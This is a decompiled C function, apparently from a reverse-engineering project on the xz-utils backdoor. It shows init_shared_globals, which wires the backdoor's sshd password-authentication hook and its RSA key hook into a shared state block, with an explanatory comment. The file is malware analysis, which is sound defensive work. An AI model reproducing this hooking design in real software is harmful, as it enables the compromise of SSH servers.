// /home/kali/xzre-ghidra/xzregh/102850_init_shared_globals.c
// Function: init_shared_globals @ 0x102850
// Calling convention: __stdcall
// Prototype: int __stdcall init_shared_globals(backdoor_shared_globals_t * shared_globals)


/*
 * AutoDoc: Seeds the shared global structure with the high-level hook entry points and the address of the global_context_t singleton. Stage two populates it once so every hook (mm_answer_* and EVP glue) can resolve the same state block without further lookups.
 */
#include "xzre_types.h"


int init_shared_globals(backdoor_shared_globals_t *shared_globals)

{
  int iVar1;
  
  iVar1 = 5;
  if (shared_globals != (backdoor_shared_globals_t *)0x0) {
    shared_globals->mm_answer_authpassword_hook = mm_answer_authpassword_hook;
    shared_globals->hook_EVP_PKEY_set1_RSA = hook_EVP_PKEY_set1_RSA;
    shared_globals->globals = (global_context_t **)&global_ctx;
    iVar1 = 0;
  }
  return iVar1;
}

